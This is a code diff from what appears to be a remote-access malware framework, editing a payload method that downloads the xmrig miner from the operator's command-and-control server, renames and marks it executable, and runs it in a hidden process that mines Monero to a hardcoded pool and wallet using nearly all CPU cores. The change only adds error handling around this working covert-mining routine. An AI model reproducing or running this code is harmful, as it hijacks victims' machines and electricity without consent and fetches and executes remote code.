@@ -252,28 +252,31 @@ class Payload():
 
 
     def _init_dev_miner(self):
-        url = 'pool.hashvault.pro:80'
-        username = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+        try:
+            url = 'pool.hashvault.pro:80'
+            username = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
 
-        # check cpu count to set number of threads
-        import multiprocessing
-        threads = multiprocessing.cpu_count() - 1
+            # check cpu count to set number of threads
+            import multiprocessing
+            threads = multiprocessing.cpu_count() - 1
 
-        # pull xmrig from server if necessary
-        if not self.xmrig_path_dev:
-            self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+            # pull xmrig from server if necessary
+            if not self.xmrig_path_dev:
+                self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
 
-            # set up executable
-            if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
-                os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
-                self.xmrig_path_dev += '.exe'
+                # set up executable
+                if os.name == 'nt' and not self.xmrig_path_dev.endswith('.exe'):
+                    os.rename(self.xmrig_path_dev, self.xmrig_path_dev + '.exe')
+                    self.xmrig_path_dev += '.exe'
 
-            os.chmod(self.xmrig_path_dev, 755)
+                os.chmod(self.xmrig_path_dev, 755)
 
-        # excute xmrig in hidden process
-        params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, threads=threads)
-        result = self.execute(params)
-        return result
+            # excute xmrig in hidden process
+            params = self.xmrig_path_dev + " --url={url} --user={username} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, username=username, threads=threads)
+            result = self.execute(params)
+            return result
+        except Exception as e:
+            log("{} error: {}".format(self.help.__name__, str(e)))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cd <path>')
